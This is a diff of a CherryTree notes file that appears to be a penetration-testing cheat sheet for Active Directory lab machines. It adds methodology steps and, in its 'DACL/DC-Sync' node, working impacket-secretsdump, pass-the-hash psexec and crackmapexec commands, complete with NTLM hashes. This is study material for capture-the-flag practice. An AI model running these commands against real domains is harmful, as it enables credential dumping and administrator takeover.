@@ -1477,7 +1477,7 @@ Password: &lt;password&gt;</codebox>
         <codebox char_offset="628" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">put &lt;filename&gt;</codebox>
         <codebox char_offset="653" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">get &lt;filename&gt;</codebox>
       </node>
-      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1697069760">
+      <node name="Active Directory" unique_id="35" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686505" ts_lastsave="1697142654">
         <rich_text>
 </rich_text>
         <rich_text scale="h2">Methodology:</rich_text>
@@ -1496,10 +1496,17 @@ Password: &lt;password&gt;</codebox>
         <rich_text link="node 89">88 Kerberos Auth</rich_text>
         <rich_text>
 ☐ checkwinpeas (add any other user or credentials)
+☐ if u find </rich_text>
+        <rich_text family="monospace">users</rich_text>
+        <rich_text> make sure if there are matching users using </rich_text>
+        <rich_text family="monospace">net user </rich_text>
+        <rich_text>command or/and checking </rich_text>
+        <rich_text family="monospace">dir c:/Users</rich_text>
+        <rich_text>
 ☐ use blood hound (check and update priveleges)
 ☐ run </rich_text>
         <rich_text link="node 85">secretdumps-GetAllHashes</rich_text>
-        <rich_text> dump with ur initial set of credentials
+        <rich_text> dump with ur initial set of credentials to get priviliged hashes
 _______________________________________________________________
 
 
@@ -2741,7 +2748,7 @@ ref: </rich_text>
           <codebox char_offset="70" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Import-Module .\PowerView.ps1</codebox>
           <codebox char_offset="93" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">. .\PowerView.ps1</codebox>
         </node>
-        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1696735065">
+        <node name="DACL/DC-Sync" unique_id="100" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1696734710" ts_lastsave="1697146357">
           <rich_text>check the Forest writeup for priv esc
 
 </rich_text>
@@ -2749,6 +2756,28 @@ ref: </rich_text>
           <rich_text>
 </rich_text>
           <rich_text link="webs https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521">https://iammainul.medium.com/hackthebox-forest-walkthrough-90052aae5521</rich_text>
+          <rich_text>
+
+
+
+PS:
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+once u get the hash use it
+
+
+</rich_text>
+          <rich_text justification="left"></rich_text>
+          <rich_text>
+
+
+from here u will get the</rich_text>
+          <codebox char_offset="186" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump htb.local/user:pass@10.11.1.</codebox>
+          <codebox char_offset="217" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  EGOTISTICAL-BANK.LOCAL/administrator@10.11.1. -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</codebox>
+          <codebox char_offset="220" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.11.1. -u administrator -H aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6</codebox>
         </node>
       </node>
       <node name="nmap" unique_id="36" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687686543" ts_lastsave="1687686592">
